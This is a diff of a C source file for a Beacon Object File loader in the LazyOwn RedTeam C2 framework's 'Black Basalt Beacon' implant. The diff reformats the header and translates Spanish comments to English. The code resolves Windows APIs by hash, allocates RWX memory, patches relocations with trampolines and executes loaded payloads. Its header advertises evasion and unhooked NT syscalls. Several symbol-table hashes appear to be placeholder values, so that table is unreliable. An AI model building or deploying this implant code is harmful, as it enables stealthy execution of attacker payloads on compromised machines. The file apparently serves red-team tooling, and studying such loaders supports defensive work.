@@ -1,84 +1,64 @@
 /**
- * ╔══════════════════════════════════════════════════════════════════════════════╗
- * ║                         LAZYOWN REDTEAM COFF LOADER 3                        ║
- * ║                             (Black Basalt Beacon)                            ║
- * ╚══════════════════════════════════════════════════════════════════════════════╝
+ * LAZYOWN REDTEAM COFF LOADER 3
+ * (Black Basalt Beacon)
  *
- * ┌──────────────────────────────────────────────────────────────────────────────┐
- * │ PURPOSE                                                                      │
- * ├──────────────────────────────────────────────────────────────────────────────┤
- * │ This module implements a custom COFF (Common Object File Format) loader      │
- * │ designed specifically for the LazyOwn RedTeam C2 framework. It enables       │
- * │ dynamic loading and execution of Beacon Object Files (BOFs) inside a         │
- * │ Black Basalt-based beacon agent without relying on C0b4lt Str1k3.            │
- * │                                                                              │
- * │ The loader resolves external symbols (APIs, Beacon functions) via DJB2 hash, │
- * │ applies x64 relocations (ADDR64, REL32, etc.), handles out-of-range jumps    │
- * │ via trampolines, and safely invokes the target 'go' function with proper     │
- * │ stack alignment.                                                             │
- * │                                                                              │
- * │ All memory allocations are RWX where needed, and no CRT functions are used   │
- * │ to ensure maximum compatibility and evasion in locked-down environments.     │
- * └──────────────────────────────────────────────────────────────────────────────┘
+ * PURPOSE
+ *   This module implements a custom COFF (Common Object File Format) loader
+ *   designed specifically for the LazyOwn RedTeam C2 framework. It enables
+ *   dynamic loading and execution of Beacon Object Files (BOFs) inside a
+ *   Black Basalt-based beacon agent without relying on C0b4lt Str1k3.
  *
- * ┌──────────────────────────────────────────────────────────────────────────────┐
- * │ FEATURES                                                                     │
- * ├──────────────────────────────────────────────────────────────────────────────┤
- * │ ✅ x64 COFF parsing & section loading                                         │
- * │ ✅ Full support for IMAGE_REL_AMD64_* relocations                             │
- * │ ✅ Trampoline generation for REL32 out-of-range targets                       │
- * │ ✅ DJB2 hash-based symbol resolution (no string compares at runtime)          │
- * │ ✅ Prefixed symbol support (e.g., "KERNEL32$CreateFileA" → "CreateFileA")     │
- * │ ✅ Internal symbol resolution (between COFF sections)                         │
- * │ ✅ BeaconPrintf debugging at every critical step                              │
- * │ ✅ Stack-aligned 'go' function invocation to prevent crashes                  │
- * │ ✅ No CRT dependencies — pure WinAPI + Beacon API                             │
- * │ ✅ Support for unhooked NT syscalls (via g_pNt*Unhooked symbols)              │
- * └───────────────────────────────────────────────────────────────────────────────┘
+ *   The loader resolves external symbols (APIs, Beacon functions) via DJB2 hash,
+ *   applies x64 relocations (ADDR64, REL32, etc.), handles out-of-range jumps
+ *   via trampolines, and safely invokes the target 'go' function with proper
+ *   stack alignment.
  *
- * ┌──────────────────────────────────────────────────────────────────────────────┐
- * │ SYMBOL RESOLUTION                                                            │
- * ├──────────────────────────────────────────────────────────────────────────────┤
- * │ External symbols (e.g., "__imp_CreateProcessA", "BeaconPrintf") are resolved │
- * │ via a precomputed DJB2 hash table (`g_symbol_table`).                        │
- * │                                                                              │
- * │ Prefixes like "KERNEL32$", "ADVAPI32$", etc. are automatically stripped      │
- * │ before hashing.                                                              │
- * │                                                                              │
- * │ Internal symbols (within the COFF) are resolved by section offset.           │
- * └──────────────────────────────────────────────────────────────────────────────┘
+ *   All memory allocations are RWX where needed, and no CRT functions are used
+ *   to ensure maximum compatibility and evasion in locked-down environments.
  *
- * ┌──────────────────────────────────────────────────────────────────────────────┐
- * │ USAGE                                                                        │
- * ├──────────────────────────────────────────────────────────────────────────────┤
- * │ int RunCOFF(                                                                 │
- * │     const char* functionname,  // typically "go"                             │
- * │     unsigned char* coff_data,  // raw COFF bytes                             │
- * │     uint32_t filesize,         // size of COFF blob                          │
- * │     unsigned char* argumentdata, // args to pass to 'go'                     │
- * │     int argumentSize           // length of args                             │
- * │ );                                                                           │
- * │                                                                              │
- * │ Returns 0 on success, 1 on failure.                                          │
- * └──────────────────────────────────────────────────────────────────────────────┘
+ * FEATURES
+ *   - x64 COFF parsing & section loading
+ *   - Full support for IMAGE_REL_AMD64_* relocations
+ *   - Trampoline generation for REL32 out-of-range targets
+ *   - DJB2 hash-based symbol resolution (no string compares at runtime)
+ *   - Prefixed symbol support (e.g., "KERNEL32$CreateFileA" -> "CreateFileA")
+ *   - Internal symbol resolution (between COFF sections)
+ *   - BeaconPrintf debugging at every critical step
+ *   - Stack-aligned 'go' function invocation to prevent crashes
+ *   - No CRT dependencies -- pure WinAPI + Beacon API
+ *   - Support for unhooked NT syscalls (via g_pNt*Unhooked symbols)
  *
- * ┌──────────────────────────────────────────────────────────────────────────────┐
- * │ COMPATIBILITY                                                                │
- * ├──────────────────────────────────────────────────────────────────────────────┤
- * │ ✔ Windows x64 (tested on 10/11, Server 2016+)                                │
- * │ ✔ GCC/MinGW-w64 compiled BOFs                                                │
- * │ ✔ LazyOwn RedTeam C2 Framework                                               │
- * │ ✔ Black Basalt Beacon (custom implementation)                                │
- * │ ✘ NOT compatible with Cobalt Strike — this is a fully independent loader.    │
- * └──────────────────────────────────────────────────────────────────────────────┘
+ * SYMBOL RESOLUTION
+ *   External symbols (e.g., "__imp_CreateProcessA", "BeaconPrintf") are resolved
+ *   via a precomputed DJB2 hash table (`g_symbol_table`).
  *
- * ┌──────────────────────────────────────────────────────────────────────────────┐
- * │ AUTHOR & LICENSE                                                             │
- * ├──────────────────────────────────────────────────────────────────────────────┤
- * │ Developed for the LazyOwn RedTeam Framework.                                 │
- * │ © 2025 LazyOwn Project — GPLv3                                               │
- * │ For authorized red team use only.                                            │
- * └──────────────────────────────────────────────────────────────────────────────┘
+ *   Prefixes like "KERNEL32$", "ADVAPI32$", etc. are automatically stripped
+ *   before hashing.
+ *
+ *   Internal symbols (within the COFF) are resolved by section offset.
+ *
+ * USAGE
+ *   int RunCOFF(
+ *       const char* functionname,  // typically "go"
+ *       unsigned char* coff_data,  // raw COFF bytes
+ *       uint32_t filesize,         // size of COFF blob
+ *       unsigned char* argumentdata, // args to pass to 'go'
+ *       int argumentSize           // length of args
+ *   );
+ *
+ *   Returns 0 on success, 1 on failure.
+ *
+ * COMPATIBILITY
+ *   + Windows x64 (tested on 10/11, Server 2016+)
+ *   + GCC/MinGW-w64 compiled BOFs
+ *   + LazyOwn RedTeam C2 Framework
+ *   + Black Basalt Beacon (custom implementation)
+ *   - NOT compatible with Cobalt Strike -- this is a fully independent loader.
+ *
+ * AUTHOR & LICENSE
+ *   Developed for the LazyOwn RedTeam Framework.
+ *   (c) 2025 LazyOwn Project -- GPLv3
+ *   For authorized red team use only.
  */
 
 #include <windows.h>
@@ -628,7 +608,7 @@ typedef struct {
 } COFFHeader;
 #pragma pack(pop)
 
-// === Función hash DJB2 ===
+// === DJB2 hash function ===
 static uint32_t djb2_hash(const char* str) {
     uint32_t hash = 5381;
     int c;
@@ -638,15 +618,15 @@ static uint32_t djb2_hash(const char* str) {
     return hash;
 }
 
-// === Tabla de símbolos por hash ===
+// === Symbol table by hash ===
 typedef struct {
     uint32_t hash;
     void* ptr;
 } SymbolHash;
 
-// === Tabla de símbolos por hash (djb2)
+// === Symbol table by hash (djb2)
 static SymbolHash g_symbol_table[] = {
-    // === Funciones Beacon ===
+    // === Beacon functions ===
     { 0xE2494BA2, (void*)BeaconDataParse },                  // "BeaconDataParse"
     { 0x1a2b3c4d, (void*)BeaconDataInt },                    // "BeaconDataInt"
     { 0x5e6f7a8b, (void*)BeaconDataShort },                  // "BeaconDataShort"
@@ -655,7 +635,7 @@ static SymbolHash g_symbol_table[] = {
     { 0x36b7a083, (void*)BeaconPrintf },
     { 0x6df4b81e, (void*)BeaconOutput },                     // "BeaconOutput"
     
-    // === Funciones del sistema ===
+    // === System functions ===
     { 0x266A0B1E, (void*)&__imp_LoadLibraryA },
     { 0x266A0B34, (void*)&__imp_LoadLibraryW },
     { 0x3EB5B2FB, (void*)&__imp_GetModuleHandleA },
@@ -919,7 +899,7 @@ static void* create_trampoline(void* target) {
     // Allocate executable memory for trampoline
     void* trampoline = VirtualAlloc(NULL, 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!trampoline) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF] can't assign memory to trampolín\n");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF] can't assign memory to trampoline\n");
         return NULL;
     }
     
@@ -934,7 +914,7 @@ static void* create_trampoline(void* target) {
     code[10] = 0xFF; // JMP
     code[11] = 0xE0; // /4 rax
     
-    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Trampolín created in %p -> %p \n", trampoline, target);
+    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Trampoline created in %p -> %p \n", trampoline, target);
     return trampoline;
 }
 BOOL handle_relocation(COFFRelocation* rel, void* patch_addr, void* target, 
@@ -988,12 +968,12 @@ BOOL handle_relocation(COFFRelocation* rel, void* patch_addr, void* target,
             if (offset < INT32_MIN || offset > INT32_MAX) {
                 void* trampoline = create_trampoline(target);
                 if (!trampoline) {
-                    BeaconPrintf(CALLBACK_ERROR, "[BOF] Trampolín failed to '%s' \n", sym_name);
+                    BeaconPrintf(CALLBACK_ERROR, "[BOF] Trampoline failed to '%s' \n", sym_name);
                     return FALSE;
                 }
                 offset = (int64_t)trampoline - ((int64_t)patch_addr + 4);
                 if (offset < INT32_MIN || offset > INT32_MAX) {
-                    BeaconPrintf(CALLBACK_ERROR, "[BOF] Trampolín out range to '%s' \n", sym_name);
+                    BeaconPrintf(CALLBACK_ERROR, "[BOF] Trampoline out of range to '%s' \n", sym_name);
                     return FALSE;
                 }
                 BeaconPrintf(CALLBACK_OUTPUT, "[BOF] doing trampolin '%s': %p \n", sym_name, trampoline);
@@ -1070,7 +1050,7 @@ BOOL handle_relocation(COFFRelocation* rel, void* patch_addr, void* target,
         }
         
         default: {
-            BeaconPrintf(CALLBACK_ERROR, "[BOF] Type of rellocation x64 unknown: %d para '%s'\n", 
+            BeaconPrintf(CALLBACK_ERROR, "[BOF] Type of rellocation x64 unknown: %d for '%s'\n", 
                         rel->Type, sym_name);
             return FALSE;
         }
@@ -1104,7 +1084,7 @@ __attribute__((noinline))
 static void call_go_aligned(void* func, char* arg1, int arg2) {
     typedef void (__attribute__((ms_abi)) *f_t)(char*, int);
     f_t f = (f_t)func;
-    f(arg1, arg2);   // ← compiler emitirá callq + ret automáticamente
+    f(arg1, arg2);   // <- compiler will emit callq + ret automatically
     
 }
 
@@ -1130,13 +1110,13 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
         return 1;
     }
 
-    // Número de secciones razonable
+    // Reasonable number of sections
     if (hdr->NumberOfSections == 0 || hdr->NumberOfSections > 32) {
         BeaconPrintf(CALLBACK_ERROR, "[BOF][x] Invalid section count: %d\n", hdr->NumberOfSections);
         return 1;
     }
 
-    // PointerToSymbolTable debe estar dentro del archivo
+    // PointerToSymbolTable must be within the file
     if (hdr->PointerToSymbolTable >= filesize) {
         BeaconPrintf(CALLBACK_ERROR, "[BOF][x] Symbol table out of bounds\n");
         return 1;
@@ -1155,7 +1135,7 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
         return 1;
     }
 
-    // Cargar secciones
+    // Load sections
     for (int i = 0; i < hdr->NumberOfSections; i++) {
         size_t size = sect[i].SizeOfRawData;
         if (size == 0) size = 1;
@@ -1178,7 +1158,7 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
 
     BeaconPrintf(CALLBACK_ERROR, "[BOF] relocations \n");
 
-    // Procesar relocalizaciones
+    // Process relocations
     for (int i = 0; i < hdr->NumberOfSections; i++) {
         if (!sect[i].PointerToRelocations || sect[i].NumberOfRelocations == 0) continue;
 
@@ -1211,7 +1191,7 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
                 continue;
             }
 
-            // Validar caracteres del nombre del símbolo
+            // Validate symbol name characters
             int valid = 1;
             for (int k = 0; sym_name[k] != 0 && k < 255; k++) {
                 if (sym_name[k] < 32 || sym_name[k] > 126) {
@@ -1221,7 +1201,7 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
             }
             if (!valid) continue;
 
-            // Procesar prefijos de biblioteca
+            // Process library prefixes
             char* search_name = sym_name;
             if (strncmp(sym_name, "KERNEL32$", 9) == 0) {
                 search_name = sym_name + 9;
@@ -1231,9 +1211,9 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
                 search_name = sym_name + 9;
             }
 
-            // LOG DEL HASH — ¡CRUCIAL PARA DEPURAR!
+            // HASH LOG -- CRUCIAL FOR DEBUGGING!
             uint32_t name_hash = djb2_hash(search_name);
-            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Searching Simbol: '%s' (original: '%s') → HASH=0x%08X \n", search_name, sym_name, name_hash);
+            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Searching Simbol: '%s' (original: '%s') -> HASH=0x%08X \n", search_name, sym_name, name_hash);
 
             void* target = NULL;
             char* patch_addr = (char*)sections[i] + rel->VirtualAddress;
@@ -1244,14 +1224,14 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
                     continue;
                 }
                 
-                // Leer el addend del código compilado
+                // Read the addend from the compiled code
                 int32_t addend = *(int32_t*)patch_addr;
                 target = (char*)sections[s->SectionNumber - 1] + s->Value + addend;
                 
-                BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Simbol intern '%s' → section %d + offset 0x%X + addend 0x%X = %p \n",
+                BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Internal symbol '%s' -> section %d + offset 0x%X + addend 0x%X = %p \n",
                             search_name, s->SectionNumber, s->Value, addend, target);
             } else {
-                // Resolver símbolo externo por hash
+                // Resolve external symbol by hash
                 for (int k = 0; g_symbol_table[k].ptr; k++) {
                     if (g_symbol_table[k].hash == name_hash) {
                         target = g_symbol_table[k].ptr;
@@ -1264,7 +1244,7 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
                 BeaconPrintf(CALLBACK_ERROR, "[BOF] SIMBOL NOT SOLVED: '%s' (hash=0x%08X) \n", search_name, name_hash);
                 continue;
             } else {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] Solved '%s' → %p", search_name, target);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] Solved '%s' -> %p", search_name, target);
             }
 
             if (rel->VirtualAddress >= sect[i].SizeOfRawData) {
@@ -1272,7 +1252,7 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
                 continue;
             }
 
-            // Detecta si la reloc ya fue aplicada (evita sobrescritura)
+            // Detect if the relocation was already applied (avoids overwrite)
             int32_t current_offset = *(int32_t*)patch_addr;
             int32_t expected_offset = (int32_t)((int64_t)target - ((int64_t)patch_addr + 4));
             if (current_offset == expected_offset) {
@@ -1280,9 +1260,9 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
                 continue;
             }
 
-            // Aplicar relocalizaciones según arquitectura
+            // Apply relocations by architecture
 #ifdef _WIN64
-            const char* resolved_sym_name = sym_name; // Usamos el nombre que ya obtuvimos antes
+            const char* resolved_sym_name = sym_name; // Use the name we already obtained before
             if (!handle_relocation(rel, patch_addr, target, sections, resolved_sym_name, /*base_addr*/ NULL)) {
                 BeaconPrintf(CALLBACK_ERROR, "[BOF] Failed rellocation type %d \n", rel->Type);
                 continue;
@@ -1301,7 +1281,7 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
         }
     }
 
-    // 🕵️‍♂️ DEBUG: Listar todos los símbolos
+    // DEBUG: List all symbols
     BeaconPrintf(CALLBACK_ERROR, "[BOF] === LIST OF SIMBOLS === \n");
     for (int i = 0; i < hdr->NumberOfSymbols; i++) {
         char* sym_name = get_symbol_name(&sym[i], strtab, strtab_size);
@@ -1324,7 +1304,7 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
     }
     BeaconPrintf(CALLBACK_ERROR, "[BOF] === END LIST ===\n");
 
-    // BUSCAR FUNCIÓN DE ENTRADA
+    // FIND ENTRY FUNCTION
     BeaconPrintf(CALLBACK_ERROR, "[BOF] Searching FUNC '%s'...\n", functionname);
     bof_func_t go = NULL;
     for (int i = 0; i < hdr->NumberOfSymbols; i++) {
@@ -1337,13 +1317,13 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
                 continue;
             }
             go = (bof_func_t)((char*)sections[sym[i].SectionNumber - 1] + sym[i].Value);
-            BeaconPrintf(CALLBACK_ERROR, "[BOF] Func '%s' found in section %d, offset 0x%X → %p \n", 
+            BeaconPrintf(CALLBACK_ERROR, "[BOF] Func '%s' found in section %d, offset 0x%X -> %p \n", 
                         functionname, sym[i].SectionNumber, sym[i].Value, go);
             break;
         }
     }
 
-    // EJECUTAR FUNCIÓN
+    // EXECUTE FUNCTION
     if (go) {
         BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Exec go on %p \n", go);
         BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Bytes in go: %02X %02X %02X %02X %02X %02X %02X %02X \n",
@@ -1361,7 +1341,7 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
         VirtualQuery((void*)((uintptr_t)&mbi & ~0xFFF), &mbi, sizeof(mbi));
         BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] stack: base=%p  size=%p  prot=%08X \n",
                     mbi.BaseAddress, mbi.RegionSize, mbi.Protect);
-        // Llamada ALINEADA — ¡CRUCIAL PARA BOFs GRANDES!
+        // ALIGNED call -- CRUCIAL for large BOFs!
         call_go_aligned(go, (char*)argumentdata, argumentSize);
 
         BeaconPrintf(CALLBACK_OUTPUT, "[COFF] End '%s'\n", functionname);
